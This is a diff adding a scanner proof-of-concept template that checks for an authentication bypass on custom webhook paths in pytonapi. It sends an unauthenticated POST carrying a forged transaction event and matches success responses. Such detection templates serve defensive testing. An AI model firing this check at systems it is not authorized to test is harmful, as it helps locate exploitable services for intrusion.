@@ -1,0 +1,47 @@
+[info]
+author = "ave"
+description = "验证 pytonapi Webhook 自定义路径认证绕过漏洞：向自定义路径发送无认证的 POST 请求，验证是否绕过认证并触发处理器"
+id = "POC-AVE-2026-0717"
+name = "CVE-2026-54635 PoC"
+severity = "high"
+tags = ["ave-2026-0717"]
+vuln_id = [
+    "CVE-2026-54635",
+    "AVE-2026-0717",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/hook/custom"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"event": "account_tx", "data": {"account": "EQD", "tx_hash": "test_hash", "utime": 1234567890}}'
+type = "json"
+
+[poc.requests.headers]
+Content-Type = "application/json"
+User-Agent = "AVE-PoC/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+status = [
+    200,
+    202,
+    201,
+]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "success",
+    "ok",
+    "accepted",
+    "processed",
+]
